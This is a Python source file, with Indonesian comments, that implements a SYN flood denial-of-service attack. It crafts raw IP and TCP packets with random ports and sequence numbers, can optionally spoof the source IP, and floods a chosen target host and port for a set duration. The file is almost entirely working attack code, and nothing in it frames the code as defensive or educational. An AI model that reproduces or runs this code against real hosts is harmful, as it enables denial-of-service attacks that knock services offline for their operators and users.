import socket
import struct
import random
import time
import logging
#from utils import spoofing, adaptive, obfuscation

log = logging.getLogger(__name__)

def attack(target, port, duration, spoof=False):
    start_time = time.time()
    end_time = start_time + duration
    packets_sent = 0

    try:
        while time.time() < end_time:
            try:
                # Raw socket untuk SYN flood
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

                # --- IP Header ---
                ip_version = 4
                ip_ihl = 5
                ip_tos = 0
                ip_total_length = 0  # Kernel yang mengisi
                ip_id = random.randint(1, 65535)
                ip_frag_off = 0
                ip_ttl = random.randint(64,255)
                ip_protocol = socket.IPPROTO_TCP
                ip_checksum = 0

                if spoof:
                    ip_saddr = spoofing.generate_random_ip()
                else:
                    ip_saddr = "192.168.1.100"  # Ganti

                ip_daddr = socket.inet_aton(target)

                ip_header = struct.pack('!BBHHHBBH4s4s', (ip_version << 4) + ip_ihl, ip_tos, ip_total_length,
                                        ip_id, ip_frag_off, ip_ttl, ip_protocol, ip_checksum,
                                        socket.inet_aton(ip_saddr), ip_daddr)

                # --- TCP Header (Hanya SYN) ---
                tcp_source_port = random.randint(1024, 65535)
                tcp_dest_port = port
                tcp_seq = random.randint(0, 4294967295)
                tcp_ack_seq = 0
                tcp_doff = 5
                tcp_flags = 0b00000010  # SYN flag
                tcp_window = socket.htons(5840)
                tcp_checksum = 0
                tcp_urg_ptr = 0

                tcp_header = struct.pack('!HHLLBBHHH', tcp_source_port, tcp_dest_port, tcp_seq, tcp_ack_seq,
                                        (tcp_doff << 4) + 0, tcp_flags, tcp_window, tcp_checksum, tcp_urg_ptr)

                # --- Pseudo Header (untuk checksum) ---
                placeholder = 0
                protocol = socket.IPPROTO_TCP
                tcp_length = len(tcp_header)
                psh = struct.pack('!4s4sBBH', socket.inet_aton(ip_saddr), socket.inet_aton(target), placeholder, protocol, tcp_length)
                psh = psh + tcp_header

                tcp_checksum = checksum(psh)

                # --- Buat Ulang TCP Header dengan Checksum yang Benar ---
                tcp_header = struct.pack('!HHLLBBH', tcp_source_port, tcp_dest_port, tcp_seq, tcp_ack_seq,
                                            (tcp_doff << 4) + 0, tcp_flags, tcp_window) + struct.pack('H', tcp_checksum) + struct.pack('!H', tcp_urg_ptr)

                # --- Kirim Paket ---
                packet = ip_header + tcp_header
                s.sendto(packet, (target, 0))
                packets_sent += 1

            except socket.error as e:
                log.error(f"Socket error: {e}")
                break #Keluar
            except Exception as e:
                log.exception(f"An unexpected error occurred: {e}")
                break


    except KeyboardInterrupt:
        pass
    finally:
        if 's' in locals() and s:
            s.close()
        log.info(f"SYN flood attack finished. Sent {packets_sent} packets.")



def checksum(msg):
    s = 0
    if len(msg) % 2 != 0:
        msg += b'\0'
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + msg[i+1]
        s = s + w
    s = (s>>16) + (s & 0xffff)
    s = s + (s >> 16)
    s = ~s & 0xffff
    return s